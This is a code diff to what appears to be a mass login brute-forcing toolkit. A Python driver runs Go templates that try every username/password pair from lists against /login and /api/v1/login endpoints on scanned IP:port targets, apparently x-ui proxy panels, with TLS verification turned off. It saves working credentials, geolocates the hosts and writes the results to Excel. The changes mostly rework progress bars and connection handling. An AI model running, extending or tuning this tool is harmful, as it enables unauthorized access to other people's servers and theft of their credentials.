@@ -21,6 +21,7 @@ try:
     import requests
     import yaml
     from openpyxl import Workbook, load_workbook
+    from tqdm import tqdm
 except ImportError:
     # 留空，让环境检查函数处理依赖安装
     pass
@@ -55,16 +56,6 @@ import (
 
 var completedCount int64
 var isMemoryThrottled int32
-
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
 
 func memoryMonitor() {
 	var baselineMem uint64
@@ -107,7 +98,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	ip, port := parts[0], parts[1]
 
 	tr := &http.Transport{
-		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
 	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
@@ -115,25 +105,26 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
+			var err error
+			
+			// Try HTTP
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			checkURL := fmt.Sprintf("http://%s:%s/login", ip, port)
-			payload := fmt.Sprintf("username=%s&password=%s", username, password)
-			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(payload))
-			if err == nil {
-				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-				resp, err = httpClient.Do(req)
-			}
+			checkURLHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
+			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
+			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(payloadHttp))
+			reqHttp.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+			resp, err = httpClient.Do(reqHttp)
 			cancel()
 
+			// Try HTTPS if HTTP fails
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkURL = fmt.Sprintf("https://%s:%s/login", ip, port)
-				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(payload))
-				if err == nil {
-					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-					resp, err = httpClient.Do(req)
-				}
+				checkURLHttps := fmt.Sprintf("https://%s:%s/login", ip, port)
+				payloadHttps := fmt.Sprintf("username=%s&password=%s", username, password)
+				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(payloadHttps))
+				reqHttps.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+				resp, err = httpClient.Do(reqHttps)
 				cancel2()
 			}
 
@@ -144,16 +135,17 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			
 			if resp.StatusCode == http.StatusOK {
 				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
 				var responseData map[string]interface{}
 				if json.Unmarshal(body, &responseData) == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
 						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-						resp.Body.Close()
 						return
 					}
 				}
+			} else {
+				resp.Body.Close()
 			}
-			resp.Body.Close()
 		}
 	}
 }
@@ -169,50 +161,20 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
 	go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	if len(usernames) == 0 || len(passwords) == 0 {
-		fmt.Println("错误：用户名或密码列表为空。")
 		return
 	}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -258,16 +220,6 @@ import (
 var completedCount int64
 var isMemoryThrottled int32
 
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -309,7 +261,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	ip, port := parts[0], parts[1]
 
 	tr := &http.Transport{
-		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
 	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
@@ -317,26 +268,24 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
+			var err error
 			data := map[string]string{"username": username, "password": password}
 			jsonPayload, _ := json.Marshal(data)
+			
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			checkURL := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
-			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(string(jsonPayload)))
-			if err == nil {
-				req.Header.Set("Content-Type", "application/json")
-				resp, err = httpClient.Do(req)
-			}
+			checkURLHttp := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
+			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(string(jsonPayload)))
+			reqHttp.Header.Set("Content-Type", "application/json")
+			resp, err = httpClient.Do(reqHttp)
 			cancel()
 
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkURL = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
-				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(string(jsonPayload)))
-				if err == nil {
-					req.Header.Set("Content-Type", "application/json")
-					resp, err = httpClient.Do(req)
-				}
+				checkURLHttps := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
+				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(string(jsonPayload)))
+				reqHttps.Header.Set("Content-Type", "application/json")
+				resp, err = httpClient.Do(reqHttps)
 				cancel2()
 			}
 
@@ -347,16 +296,17 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			
 			if resp.StatusCode == http.StatusOK {
 				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
 				var responseData map[string]interface{}
 				if json.Unmarshal(body, &responseData) == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
 						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-						resp.Body.Close()
 						return
 					}
 				}
+			} else {
+				resp.Body.Close()
 			}
-			resp.Body.Close()
 		}
 	}
 }
@@ -372,50 +322,20 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-	
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	usernames, passwords := {user_list}, {pass_list}
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -455,16 +375,6 @@ import (
 
 var completedCount int64
 var isMemoryThrottled int32
-
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
 
 func memoryMonitor() {
 	var baselineMem uint64
@@ -553,46 +463,17 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-	
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -637,16 +518,6 @@ import (
 var completedCount int64
 var isMemoryThrottled int32
 
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -670,7 +541,6 @@ func memoryMonitor() {
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {
 	defer wg.Done()
 	tr := &http.Transport{
-		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
 	client := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
@@ -717,12 +587,15 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
         if resp != nil { resp.Body.Close() }
         return false, err 
     }
-	defer resp.Body.Close()
+	
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
 		if strings.Contains(string(bodyBytes), `{"status":"success","data"`) {
 			return true, nil
 		}
+	} else {
+		resp.Body.Close()
 	}
 	return false, nil
 }
@@ -738,46 +611,17 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	paths := {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -820,16 +664,6 @@ import (
 var completedCount int64
 var isMemoryThrottled int32
 
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -853,7 +687,6 @@ func memoryMonitor() {
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	tr := &http.Transport{
-		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
 	client := &http.Client{
@@ -928,46 +761,17 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-	
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -1019,16 +823,6 @@ var (
 	completedCount int64
     isMemoryThrottled int32
 )
-
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
 
 func memoryMonitor() {
 	var baselineMem uint64
@@ -1126,7 +920,6 @@ func getPublicIP(targetURL string) (string, error) {
 
 func checkConnection(proxyAddr string, auth *proxy.Auth, timeout time.Duration) (bool, error) {
 	transport := &http.Transport{ 
-		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
 
@@ -1189,7 +982,6 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
@@ -1200,39 +992,12 @@ func main() {
 	}
 	proxies, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法打开代理文件: %v\\n", err)
 		return
 	}
 	defer proxies.Close()
 	
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Printf("无法创建输出文件: %v\\n", err)
 		return
 	}
 	defer outFile.Close()
@@ -1277,16 +1042,6 @@ import (
 var completedCount int64
 var isMemoryThrottled int32
 
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
@@ -1319,7 +1074,6 @@ func createHttpClient() *http.Client {
 		ResponseHeaderTimeout: 2 * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
 		ForceAttemptHTTP2:     false,
-		DisableKeepAlives:     true,
 	}
 	return &http.Client{
 		Transport: tr,
@@ -1389,45 +1143,16 @@ func main() {
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
     go memoryMonitor()
 	batch, err := os.Open(inputFile)
 	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	totalLines, _ := countLines(inputFile)
-	startTime := time.Now()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				elapsed := time.Since(startTime)
-				rate := float64(current) / elapsed.Seconds()
-				eta := time.Duration(float64(totalLines-int(current)) / rate * float64(time.Second))
-				percentage := float64(current) / float64(totalLines) * 100
-				barWidth := 40
-				pos := int(float64(barWidth) * percentage / 100)
-				bar := strings.Repeat("=", pos) + strings.Repeat("-", barWidth-pos)
-				fmt.Fprintf(os.Stdout, "\\r%d%%|%s| %d/%d [%s<%s, %.2f it/s]", int(percentage), bar, current, totalLines, elapsed.Round(time.Second), eta.Round(time.Second), rate)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
@@ -1461,7 +1186,6 @@ import re
 import sys
 from openpyxl import Workbook, load_workbook
 from openpyxl.utils import get_column_letter
-from tqdm import tqdm
 
 def extract_host_port(line):
     match = re.search(r'https?://([^/\s]+)', line)
@@ -1522,10 +1246,36 @@ def extract_ip_port(url):
 
     return url.split()[0]
 
+
+def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
+    elapsed_time = time.time() - start_time
+    percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
+    filled_length = int(length * iteration // total)
+    bar = fill * filled_length + '-' * (length - filled_length)
+
+    if iteration > 0 and elapsed_time > 0:
+        its_per_sec = iteration / elapsed_time
+        remaining_time = (total - iteration) / its_per_sec
+        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
+    else:
+        its_per_sec = 0
+        eta_str = "??:??"
+
+    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
+    
+    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
+    
+    sys.stdout.write(progress_str)
+    sys.stdout.flush()
+    if iteration == total:
+        sys.stdout.write('\n')
+
 def process_ip_port_file(input_file, output_excel):
     with open(input_file, 'r', encoding='utf-8') as f:
         lines = [line.strip() for line in f if line.strip()]
-    
+    total_tasks = len(lines)
+    start_time = time.time()
+
     headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
 
     if os.path.exists(output_excel):
@@ -1537,10 +1287,14 @@ def process_ip_port_file(input_file, output_excel):
     ws.append(headers)
     wb.save(output_excel)
 
-    for line in tqdm(lines, desc="IP信息查询"):
+    print_progress_bar(0, total_tasks, start_time, prefix='IP信息查询', suffix='开始...')
+    for i, line in enumerate(lines):
+        completed_tasks = i + 1
+        
         addr = line
         user, passwd = '', ''
         
+        # More robust parsing for proxy URLs
         try:
             parsed_url = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?(.+)', line)
             if parsed_url:
@@ -1548,6 +1302,7 @@ def process_ip_port_file(input_file, output_excel):
                 passwd = parsed_url.group(3) or ''
                 addr = f"{parsed_url.group(1)}://{parsed_url.group(4)}"
         except (TypeError, AttributeError):
+             # Fallback for simple ip:port user pass format
             parts = line.split()
             if len(parts) >= 3:
                 addr, user, passwd = parts[0], parts[1], parts[2]
@@ -1557,6 +1312,7 @@ def process_ip_port_file(input_file, output_excel):
         ip_port = extract_ip_port(addr)
         ip_info = get_ip_info(ip_port)
         
+        # If user/passwd were parsed from URL, use them
         row = [line, ip_port, user, passwd] + ip_info[1:]
 
         wb = load_workbook(output_excel)
@@ -1564,6 +1320,8 @@ def process_ip_port_file(input_file, output_excel):
         ws.append(row)
         adjust_column_width(ws)
         wb.save(output_excel)
+
+        print_progress_bar(completed_tasks, total_tasks, start_time, prefix='IP信息查询', suffix=f'{ip_port}')
         time.sleep(1.5)
     print("\nIP信息查询完成！")
 
@@ -1801,7 +1559,6 @@ def cleanup_swap(swap_file):
 
 def run_xui_for_parts(sleep_seconds, executable_name, total_ips, semaphore_size):
     part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
-    total_parts = len(part_files)
     
     total_memory = psutil.virtual_memory().total
     mem_limit = int(total_memory * 0.70 / 1024 / 1024)
@@ -1812,40 +1569,42 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips, semaphore_size)
     run_env["GOGC"] = "50"
     print("--- 已设置Go垃圾回收器(GC)更积极地运行以控制内存。 ---")
 
-    for idx, part in enumerate(part_files, 1):
-        print(f"\n--- [开始处理 Part {idx}/{total_parts}] ---")
-        while True:
-            mem_info = psutil.virtual_memory()
-            available_percent = mem_info.available / mem_info.total * 100
-            if available_percent < 15:
-                print(f"\n⚠️ 系统可用内存低于15% (当前: {available_percent:.2f}%)，暂停60秒以待系统恢复...")
-                time.sleep(60)
-            else:
-                break
-        
-        part_path = os.path.join(TEMP_PART_DIR, part)
-        
-        try:
-            if sys.platform != "win32":
-                os.chmod(executable_name, 0o755)
+    with tqdm(total=total_ips, desc="爆破进度", unit="ip", ncols=100) as pbar:
+        for idx, part in enumerate(part_files, 1):
+            pbar.set_description(f"处理Part {idx}/{len(part_files)}")
+            while True:
+                mem_info = psutil.virtual_memory()
+                available_percent = mem_info.available / mem_info.total * 100
+                if available_percent < 15:
+                    tqdm.write(f"\n⚠️ 系统可用内存低于15% (当前: {available_percent:.2f}%)，暂停60秒以待系统恢复...")
+                    time.sleep(60)
+                else:
+                    break
             
-            output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
-            cmd = ['./' + executable_name, part_path, output_file]
+            part_path = os.path.join(TEMP_PART_DIR, part)
+            
+            ips_in_part = 0
+            with open(part_path, 'r', encoding='utf-8') as f:
+                ips_in_part = sum(1 for _ in f)
 
-            # Let the Go process write directly to the terminal
-            process = subprocess.Popen(cmd, env=run_env)
-            process.wait()
+            try:
+                if sys.platform != "win32":
+                    os.chmod(executable_name, 0o755)
+                
+                output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
+                cmd = ['./' + executable_name, part_path, output_file]
 
-            if process.returncode != 0:
-                 raise subprocess.CalledProcessError(process.returncode, cmd)
-
-        except subprocess.CalledProcessError as e:
-            print(f"\n--- 程序执行失败: {part} ---")
-            print(f"返回码: {e.returncode}")
-            sys.exit(1)
-        
-        print(f"--- [Part {idx}/{total_parts} 处理完成] ---")
-        time.sleep(sleep_seconds)
+                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+                
+            except subprocess.CalledProcessError as e:
+                tqdm.write(f"\n--- 程序执行失败: {part} ---")
+                tqdm.write(f"返回码: {e.returncode}")
+                if e.stderr:
+                    tqdm.write(f"错误输出: {e.stderr.decode('utf-8', errors='ignore')}")
+                sys.exit(1)
+            
+            pbar.update(ips_in_part)
+            time.sleep(sleep_seconds)
 
 def merge_xui_files():
     merged_file = 'xui.txt' 
@@ -1875,8 +1634,6 @@ def merge_result_files(prefix: str, output_name: str, target_dir: str):
 
 def run_ipcx():
     if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
-        # Add tqdm to the dependencies for ipcx.py
-        subprocess.run([sys.executable, "-m", "pip", "install", "tqdm"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run([sys.executable, 'ipcx.py'])
 
 def clean_temp_files():
@@ -1964,9 +1721,9 @@ def check_environment(template_mode):
     if platform.system().lower() == "windows":
         print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
         try:
-            import psutil, requests, openpyxl, yaml
+            import psutil, requests, openpyxl, yaml, tqdm
         except ImportError:
-            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl pyyaml")
+            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl pyyaml tqdm")
         return
 
     print(">>> 正在检查并安装依赖环境...")
@@ -2287,12 +2044,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                 if os.path.exists(verification_output_file): os.remove(verification_output_file)
 
                 cmd = ['./' + executable_name, verification_input_file, verification_output_file]
-                
-                process = subprocess.Popen(cmd, env=run_env)
-                process.wait()
-
-                if process.returncode != 0:
-                    raise subprocess.CalledProcessError(process.returncode, cmd)
+                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=run_env)
                 
                 if os.path.exists(verification_output_file):
                     with open(verification_output_file, 'r') as f:
@@ -2348,6 +2100,7 @@ if __name__ == "__main__":
                 import requests
                 import yaml
                 from openpyxl import Workbook, load_workbook
+                from tqdm import tqdm
 
                 adjust_oom_score()
                 check_and_manage_swap()
